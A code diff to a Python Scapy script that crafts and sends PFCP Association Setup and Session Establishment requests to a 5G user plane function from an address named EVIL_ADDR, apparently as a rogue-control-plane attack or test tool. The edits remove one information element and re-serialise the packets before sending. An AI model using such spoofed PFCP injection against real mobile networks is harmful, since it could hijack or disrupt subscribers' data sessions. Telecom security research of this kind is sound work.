@@ -21,12 +21,10 @@ def send_pfcp_association_setup_req():
         seid=0,
         S=0,
         seq=seq
-    )/node_id/recovery_timestamp/IE_CPFunctionFeatures(
-        OVRL=0, LOAD=0
-    )
-
+    )/node_id/recovery_timestamp
 
     packet = IP(src=EVIL_ADDR, dst=UPF_ADDR)/UDP(sport=8805, dport=8805)/pfcp_msg
+    packet = packet.__class__(bytes(packet))
     print("PFCP Association Setup packet:", packet.show())
     send(packet)
     print(f"PFCP Association Setup packet sent")
@@ -82,6 +80,7 @@ def send_pfcp_session_establishment_req():
     )/node_id/cp_f_seid/create_pdr/create_far
 
     packet = IP(src=EVIL_ADDR, dst=UPF_ADDR)/UDP(sport=8805, dport=8805)/pfcp_msg
+    packet = packet.__class__(bytes(packet))
     print("PFCP Session Establishment packet:", packet.show())
     send(packet)
     print(f"PFCP Session Establishment packet sent")
@@ -129,7 +128,7 @@ def send_pfcp_session_establishment_test():
     ])
 
     pkt = IP(src=src_ip, dst=dst_ip)/UDP(sport=sport, dport=dport)/pfcp_msg
-
+    pkt = pkt.__class__(bytes(pkt))
     print(f"Sending PFCP Session Establishment Request Test")
     pkt.show()
     send(pkt)
